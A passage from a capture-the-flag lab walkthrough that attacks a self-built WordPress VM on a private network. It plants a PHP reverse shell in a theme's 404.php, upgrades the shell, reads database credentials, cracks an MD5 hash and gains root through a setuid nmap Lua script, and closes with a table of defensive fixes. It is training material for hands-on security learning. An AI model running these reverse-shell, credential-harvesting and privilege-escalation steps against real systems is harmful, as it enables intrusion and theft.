installed themes, and mod_php *executes* those files as `www-data` whenever they are requested.
Replacing the `404.php` body with a reverse shell therefore converts "I can edit a file" into "I
can run code as the web server". Choosing `404.php` matters because it is (a) present in nearly
every theme, and (b) trivially triggered by requesting a URL that does not exist.

**You should see.** WordPress reports *"File edited successfully."*

**4d. Trigger it.**

```bash
# any URL that returns a 404 triggers the template
curl -s -o /dev/null http://192.168.56.20/this-page-does-not-exist
# or call the file directly
curl -s -o /dev/null http://192.168.56.20/wp-content/themes/<active-theme>/404.php
```

**What this does.** The request makes Apache run the template you just poisoned; the PHP inside
connects back to `192.168.56.1:4444`.

**You should see** your listener answer:

```text
listening on [any] 4444 ...
connect to [192.168.56.20] from workstation [192.168.56.1] 54321
Linux MrRobot 6.1.0-x-amd64 #1 SMP Debian ... x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**You now have a shell on the target as `www-data`.** First thing to do in any shell you did not
choose the size of: make it usable.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
id
whoami
```

**What this does.** The reverse shell is a plain pipe: no prompt, no job control, no tab completion,
and — critically — no controlling terminal, which is why some commands fail. `pty.spawn` upgrades
it into a real pseudo-terminal with `bash`, which fixes that and gives you `su` later.

**Common problems.**

- *Nothing connects.* Check, in order: (1) the listener was started on `192.168.56.1:4444` before
  you triggered; (2) `$ip` and `$port` are really your values (`grep '^\$ip\|^\$port'`); (3) the
  theme you edited is the **active** one; (4) you are requesting the right path
  (`/wp-content/themes/<active-theme>/404.php`); (5) the firewall on your workstation allows 4444.
- *"File edited successfully" but no connection.* Apache may be serving a cached `404.php`, or a
  plugin is rewriting 404s. Request the file path directly rather than a random URL.
- *The editor is missing.* WordPress hides the file editor when `DISALLOW_FILE_EDIT` is set in
  `wp-config.php`. If you built the box, do not set it. If you meet it on a real target, use the
  fallback below.
- *You edited the wrong theme.* Inactive themes are not executed, so nothing happens. Check
  `Appearance → Themes` for the one marked "Active".

> **Fallback: a malicious plugin.** Zip a single file containing the shell with a plugin header
> (`/* Plugin Name: Maintenance Helper */` at the top), then **Plugins → Add New → Upload Plugin**,
> install and **activate** it. Activating a plugin includes its main PHP file, which fires the
> shell immediately. Same privilege, different route.

### Stage 5 — Post-exploitation as `www-data`

Slow down here. A foothold is not a compromise; understanding the box is what makes the rest easy.

```bash
id; whoami; hostname
cat /etc/os-release | head -2
uname -r
ls -la /home/
ls -la /home/robot/
cat /home/robot/password.raw-md5
ls -la /var/www/html | head -20
sudo -l 2>&1 | head -5
```

**What this does.** `id` and `whoami` confirm who you are (never assume). `/etc/os-release` and
`uname -r` tell you the distribution and kernel, which drives every later kernel-exploit
decision. `/home` shows which local users exist; `/home/robot` shows which of their files you can
read. `sudo -l` asks what you may run as root — expect nothing.

**You should see.**

- `uid=33(www-data) gid=33(www-data) groups=33(www-data)` — the web server's account, and nothing
  else.
- In `/home/robot` two files: `key-2-of-3.txt` (`-r--------`, owner `robot`) and
  `password.raw-md5` (`-rw-r--r--`, owner `robot`).
- `cat /home/robot/password.raw-md5` works and prints a line like
  `robot:c3fcd3d76192e4007dfb496cca67e13b` — `username:hash`. **This is the credential that opens
  key 2.**
- `sudo -l` reports that `www-data` may not run sudo, or that you are not allowed to run it.

**Why you cannot just read key 2.** Try it:

```bash
cat /home/robot/key-2-of-3.txt
ls /root/
```

**You should see** `Permission denied` for the key, and `Permission denied` for `/root`. That is
the design: the hash file is world-readable, the key is not. The credential is the bridge.

**Two useful side-observations** while you are here:

```bash
cat /var/www/html/wp-config.php | grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST"
ss -lnt
```

`wp-config.php` is readable by `www-data` (it must be, PHP reads it), so the database password is
yours. `ss -lnt` from inside the guest shows MariaDB listening on `127.0.0.1:3306` — the loopback
bind you configured in the build, now visible from the other side.

**Now do this.** Copy the hash out so you can crack it, and note the username:

```bash
cut -d: -f2 /home/robot/password.raw-md5
```

**You should see** a 32-character hex string — an MD5 digest. MD5 is unsalted and extremely fast,
so "cracking" it usually means *looking it up*.

### Stage 6 — User escalation: become `robot`

A 32-hex-character MD5 can be cracked offline or with a lookup service.

```bash
# Option 1 — hashcat (mode 0 = raw MD5)
echo 'robot:<the 32 hex chars>' > robot.md5
hashcat -m 0 robot.md5 /usr/share/wordlists/rockyou.txt --show

# Option 2 — John the Ripper
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt robot.md5

# Option 3 — any online MD5 lookup (paste the digest, not the username)
```

**What this does.** All three compare the digest against candidate words. `--show` prints the
already-cracked result; `john` prints it when it finishes. A 32-character hex digest with no salt
is the weakest common password storage still found in the wild, and it is what the original box
shipped.

**You should see** the plaintext. On the original box the hash `c3fcd3d76192e4007dfb496cca67e13b`
was simply `abcdefghijklmnopqrstuvwxyz` — a deliberately insulting password, chosen to make the
point that a hash adds no strength when the secret is trivial. On **your** build the plaintext is
whatever you put in `ROBOT_PW`.

Now switch user:

```bash
su - robot
Password: <the cracked password>
id; whoami
cat /home/robot/key-2-of-3.txt
```

**What this does.** `su - robot` starts a login shell as `robot` (the `-` loads that account's
environment and home directory). Because `robot` owns `key-2-of-3.txt` and the file is mode `400`,
this session can finally read it.

**You should see.** `uid=1002(robot) gid=1002(robot) groups=1002(robot)`, then **key 2 of 3**.
Save it.

**Common problems.**

- *`su: Authentication failure`.* You cracked the wrong thing, or you typed the hash instead of
  the plaintext. Compare with `printf '%s' 'candidate' | md5sum`.
- *`su: must be run from a terminal`.* Your reverse shell has no TTY. Fix it with
  `python3 -c 'import pty; pty.spawn("/bin/bash")'` (stage 4d) and try again.
- *No wordlist on your box.* Use the online lookup, or `hashcat -m 0 robot.md5` against
  `/usr/share/wordlists/` in your attacking distribution.
- *You would rather not use a shell at all.* With `robot`'s password you can simply SSH in:
  `ssh robot@192.168.56.20`. Same account, cleaner terminal.

> **Hint:** `password.raw-md5` is the whole user stage. Its very existence is a lesson: a
> world-readable file that contains a password hash is a password disclosure, whether or not you
> have to crack it first.

### Stage 7 — Privilege escalation: the SUID `nmap`

You are `robot` — an ordinary user with no `sudo`. Now find the misconfiguration that was planted
in the build.

```bash
sudo -l
find / -xdev -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null | head
```

**What this does.** `sudo -l` asks what you may run as root (expect "not allowed" — `robot` is
deliberately not in `sudo`). `find / -perm -4000 -type f` lists every **setuid** binary on the
filesystem: files whose owner is root and which therefore start with effective uid 0 for *any*
user who runs them. `-xdev` keeps the search on one filesystem, which avoids the noise of `/proc`
and virtual mounts. `getcap` looks for the same idea expressed as POSIX capabilities.

**You should see.** The usual Debian setuid set — `su`, `sudo`, `mount`, `umount`, `passwd`,
`chsh`, `chfn`, `gpasswd`, `newgrp`, `pkexec` — plus, at the bottom or in `/usr/bin`,
**`/usr/bin/nmap`**. Those Debian binaries are setuid by design and are hardened for it. `nmap`
is not: it is a network scanner that should never need root.

Confirm it:

```bash
ls -l /usr/bin/nmap
```

**You should see** `-rwsr-xr-x 1 root root ... /usr/bin/nmap`. The `s` in the owner's execute
position *is* the setuid bit.

**Why a SUID binary yields root.** When the kernel `execve`s a file with the setuid bit set, it
starts the process with the *effective* uid of the file's owner — here, `0`. The real uid stays
yours. Permission checks (can I read `/root/key-3-of-3.txt`?) are made against the **effective**
uid. So any code the program can be made to execute runs with root's authority. The vulnerability
is not a memory-safety bug: it is that `nmap` can run arbitrary shell commands *and* it was given
root authority it never needed.

**7a. The original technique (`!sh`).**

```text
nmap --interactive
nmap> !sh
# whoami
```

On the original box, `nmap` 3.81 shipped an **interactive mode**: a small shell of its own, in
which any line beginning with `!` was passed to the system shell. Running `!sh` therefore started
`/bin/sh` with the effective uid that `nmap` had — root. The technique is documented in GTFOBins
for `nmap` versions 2.02 to 5.21.

**7b. The same technique on the current binary.** `nmap` **removed** that interactive console
years ago (its changelog records the removal, and GTFOBins lists `--interactive` only for 2.02–
5.21), so on Debian 12's `nmap` you cannot type `!sh`. The equivalent — documented in the same
place — is to drive `nmap`'s Lua scripting engine, which also executes shell commands:

```bash
TF=$(mktemp /tmp/root.XXXX.nse)
printf 'os.execute("/bin/sh")\n' > "$TF"
/usr/bin/nmap --script="$TF" 127.0.0.1
```

**What this does.** `--script=` loads an NSE (Lua) script; `os.execute()` hands a string to the
system shell, exactly what the interactive mode's `!` used to do. Target `127.0.0.1` so the scan
completes instantly and the shell appears immediately.

**You should see.** `nmap` starts, prints its usual banner and a warning or two about the script,
and then a `#` prompt or a plain `$` prompt from `/bin/sh`. Check it:

```bash
whoami
id
```

`whoami` prints **root** (the shell's effective uid is 0). `id` may also display your original uid
as the *real* uid — that is normal for a setuid-derived shell and it does not limit you: all
permission checks use the effective uid, so `www-data`/`robot` restrictions no longer apply to
you.

**Common problems.**

- *The prompt shows `$` and `whoami` says `robot`.* The setuid bit was lost, or the shell dropped
  the effective uid (some shells reset it). Re-check `ls -l /usr/bin/nmap`; if the `s` is gone,
  the build step was not run.
- *`nmap` refuses the script.* Give it a `.nse` extension (as above) and a real target argument.
  If it still refuses, use the interactive route on an `nmap` in the 2.02–5.21 range — if you want
  that exact experience, build `nmap` 5.21 from source on another machine and copy the binary in,
  or simply accept the scripted route: the privilege level and the lesson are identical.
- *You get a shell but cannot read `/root`.* Then the effective uid is not 0 — go back and verify
  the setuid bit and the file's owner.

> **Hint:** Setuid scanning tools are a recurring theme, not a one-off. `find`, `awk`, `python`,
> `vim`, `less`, `tar` and dozens of other ordinary programs can spawn shells; GTFOBins is the
> reference. The habit to build: every time you find a setuid root binary you do not recognise,
> ask "can this start a process?" — if yes, it is root.

### Stage 8 — Root and KEY 3

```bash
whoami
cat /root/key-3-of-3.txt
ls -l /root/
```

**What this does.** Reads the final proof. `/root` is mode `700`, so only root could ever list or
read it — being able to `cat` this file *is* the proof of privilege.

**You should see** key 3 of 3, and `ls -l /root/` showing files owned by `root:root`.

You now hold all three keys and a root shell. Optional tidy-up, only if the box is yours and you
are finished: `exit` the shell, then remove the setuid bit with
`sudo chmod u-s /usr/bin/nmap` so the box is safe to leave running.

## Verify / proof

Run these and keep the output. They are the evidence that you owned the machine and what the
method was.

```bash
# ---- as www-data (foothold) ----
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# ---- as robot (user stage) ----
su - robot
id
# uid=1002(robot) gid=1002(robot) groups=1002(robot)
cat /home/robot/key-2-of-3.txt
md5sum /home/robot/key-2-of-3.txt

# ---- as root (final) ----
whoami
# root
id -u
# 0
cat /root/key-3-of-3.txt
md5sum /root/key-3-of-3.txt
ls -ld /root /root/key-3-of-3.txt
```

**Expected proof, in order:** `uid=33(www-data)` → `uid=1002(robot)` → `whoami` printing `root`
with `id -u` printing `0`, and the contents of `/root/key-3-of-3.txt` matching the key you
planted in build step 9. `md5sum` on the key files gives you a stable, copy-pasteable fingerprint
for your report instead of a screenshot.

A compact way to show the whole chain in one line from your workstation:

```bash
printf 'key1: %s\n' "$(curl -s http://192.168.56.20/key-1-of-3.txt)"
printf 'wordlist: %s bytes, %s unique lines\n' \
  "$(wc -c < fsocity.dic)" "$(sort -u fsocity.dic | wc -l)"
```

## Hand-in

Submit, for each stage, the commands you ran and what they returned:

1. **Build evidence** — the output of the verification block in build step 11, the account table,
   and the package line from `dpkg-query -W`.
2. **Recon** — your `nmap` command and its port/service table, plus the note that 3306 is not
   reachable from the workstation.
3. **KEY 1** — the exact URL you fetched it from and its value.
4. **Credential attack** — the enumeration result (the two different login failures), the tool and
   wordlist you used, and the valid combination. Replace the password with `********`.
5. **Foothold** — the listener output showing the connection from `192.168.56.20`, and the `id`
   output proving `www-data`.
6. **KEY 2** — how you got from `www-data` to `robot`: the hash source, the cracking tool, and the
   `su` result. Do not paste the plaintext password — write "cracked from `password.raw-md5`".
7. **Privilege escalation** — `find / -perm -4000` output, the `ls -l /usr/bin/nmap` line showing
   the `s`, and the command you used to spawn the root shell, with a sentence explaining *why* a
   setuid binary running shell commands yields root.
8. **KEY 3** — `whoami`, `id -u`, and `cat /root/key-3-of-3.txt`.
9. **Defensive lessons** — one paragraph per weakness you exploited, as below.

**No real secrets.** Do not include the passwords of `robot`, `bloodraven`, the WordPress
administrator, or the database user. The keys themselves are the objective and are fine to submit;
the credentials that got you there are not.

## Defensive lessons (blue team)

For every weakness you used, here is what should have stopped you.

| # | Weakness you exploited | How a defender fixes it |
| --- | --- | --- |
| 1 | `robots.txt` advertised `fsocity.dic` and `key-1-of-3.txt` | Never list sensitive paths in `robots.txt`; it is public by design. Better: do not put sensitive files in the web root at all, and keep authentication-bearing files outside the document tree. |
| 2 | A wordlist downloadable from the site | Anything you serve is an attacker's input. Never place credential material, backups, `.git`, `.env` or editor swap files in a web-reachable directory; block them at the web server and monitor 404 spikes for them. |
| 3 | A weak, guessable administrator password that appeared in the leaked list | Unique, high-entropy passwords stored in a manager, plus multi-factor authentication on every WordPress admin. Rate limiting and an account-lockout/WAF rule turn a wordlist attack into a boring afternoon. |
| 4 | WordPress confirmed valid usernames through different login errors | Return identical messages for "unknown user" and "wrong password", and throttle `/wp-login.php` and `xmlrpc.php` with `fail2ban` or a WAF. Disable REST API user enumeration if you do not need it. |
| 5 | WordPress administrators could edit theme PHP | Set `DISALLOW_FILE_EDIT` (and `DISALLOW_FILE_MODS` wherever possible) in `wp-config.php`, deploy code from version control as a separate non-web user, and monitor the web root with file-integrity checking so an edited `404.php` raises an alert. |
| 6 | The document root was owned by `www-data` | Only `wp-content` (and only what must change at runtime) should be writable by the web user; core and themes should be read-only. That single change makes the theme-editor technique impossible. |
| 7 | No egress control: an outbound connection to `192.168.56.1:4444` succeeded | Restrict outbound traffic from web/DMZ hosts to what they actually need, and alert on new outbound connections from `www-data` processes. |
| 8 | A world-readable file containing an MD5 password hash (`password.raw-md5`) | Never store password hashes in world-readable files, never use unsalted MD5 (use `bcrypt`/`argon2`), enforce a real password policy, and audit home directories for readable secrets. |
| 9 | A trivially weak password for `robot` | A password manager, a length/complexity policy, and a check against breached-password lists. |
| 10 | A setuid-root `nmap` on a normal server | Remove setuid from tools that can execute commands; use file capabilities (`setcap cap_net_raw+ep`) instead of setuid where raw sockets are genuinely needed; audit with `find / -perm -4000` and check findings against GTFOBins as part of hardening. |
| 11 | The keys themselves sat on disk in predictable paths | Secrets at rest should be protected by the thing the exercise is testing; in a real environment, keys, tokens and credentials belong in a secrets manager, not in `/root` next to a world-readable hash. |
| 12 | No monitoring of any of the above | Centralise Apache and authentication logs, alert on WordPress admin logins from new addresses, on new setuid files, and on any successful `su`. Every step of this lab would have left a log line. |

The pattern behind all twelve: the machine never had a single dramatic bug. It had a small,
realistic series of ordinary mistakes — information disclosure, weak credentials, an unnecessary
file-write privilege, a readable hash, and one setuid bit — and each one handed the attacker the
next rung. That is how most real compromises work, which is why this box is worth building twice.

## Appendix A — Command quick reference

| Stage | Command |
| --- | --- |
| Host discovery / ports | `sudo nmap -sS -sV -sC -p- --open -T4 192.168.56.20` |
| Wordlist cleanup | `sort fsocity.dic | uniq > fsocity.uniq` |
| WordPress fingerprint | `curl -s http://192.168.56.20/ | grep -i generator` |
| REST user enumeration | `curl -s http://192.168.56.20/wp-json/wp/v2/users` |
| Login oracle | `curl -s -X POST -d 'log=<user>&pwd=<pass>' http://192.168.56.20/wp-login.php` |
| Password attack | `wpscan --url http://192.168.56.20 -U elliot -P fsocity.uniq` |
| Listener | `rlwrap nc -lvnp 4444` |
| Trigger the shell | `curl http://192.168.56.20/wp-content/themes/<theme>/404.php` |
| Upgrade the shell | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| Crack the local hash | `hashcat -m 0 robot.md5 rockyou.txt` |
| Find setuid binaries | `find / -xdev -perm -4000 -type f 2>/dev/null` |
| Root shell via SUID nmap | `nmap --script=<lua-file-with-os.execute> 127.0.0.1` |

## Appendix B — If you get stuck (progressive hints)

Work down this list only as far as you need.

1. **I found nothing in the nmap scan.** You probably ran the default 1,000-port scan, or you are
   not on `192.168.56.0/24`. Run `nmap -p- --open` and check `ip addr`.
2. **I do not know where key 1 is.** Read `http://192.168.56.20/robots.txt` in a browser. It lists
   the exact path.
3. **I cannot log in to WordPress.** You need the username first: the REST API lists them, or the
   login error message tells you which name is real. The password is in the file the `robots.txt`
   leaked — run `sort | uniq` on it first.
4. **`wpscan` finds nothing.** Confirm the password is in the wordlist (`grep`), and confirm you
   are using the *administrator* account, not another one.
5. **The theme editor is not there.** `DISALLOW_FILE_EDIT`. Use the plugin-upload fallback in
   stage 4.
6. **No reverse shell connects.** Listener first, `$ip`/`$port` correct, active theme, correct
   theme path. Verify with `curl -v` that the 404 template is really being executed.
7. **`su` says "must be run from a terminal".** Upgrade the shell with `python3 -c 'import pty;
   pty.spawn("/bin/bash")'`.
8. **I do not know how to become `robot`.** Read `/home/robot/password.raw-md5`, crack the MD5,
   `su - robot`.
9. **I am `robot` and have no `sudo`.** That is intentional. Run
   `find / -xdev -perm -4000 -type f 2>/dev/null` and look for something that should not be
   setuid.
10. **My `nmap` has no `--interactive`.** Correct — it was removed. Use the Lua `--script=` route
    in stage 7b; it is the same technique on a current binary.
11. **The shell I get is not root.** Check `ls -l /usr/bin/nmap` for the `s` and `root` as owner.
    Permission checks use the effective uid, so `whoami` printing `root` means you are done.
